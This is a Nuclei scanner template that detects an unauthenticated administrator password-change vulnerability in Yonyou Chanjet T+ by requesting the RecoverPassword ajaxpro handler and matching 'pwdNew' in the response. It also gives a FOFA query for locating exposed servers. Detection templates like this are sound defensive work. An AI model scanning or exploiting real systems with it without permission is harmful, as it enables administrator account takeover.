id: yongyou-RecoverPassword-Administrator-password-modification

info:
  name: 用友 畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞
  author: linuxlz
  severity: critical
  description: 用友 畅捷通T+ RecoverPassword.aspx 存在未授权管理员密码修改漏洞，攻击者可以通过该漏洞修改管理员账号密码登录后台
  reference:
    - https://mp.weixin.qq.com/s/tz54n106AAmbCdASmyn9Wg
  metadata:
    fofa-query: app="畅捷通-TPlus"
  tags: yongyou,RecoverPassword

http:
  - raw:
      - |
        GET /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "pwdNew"
        condition: and
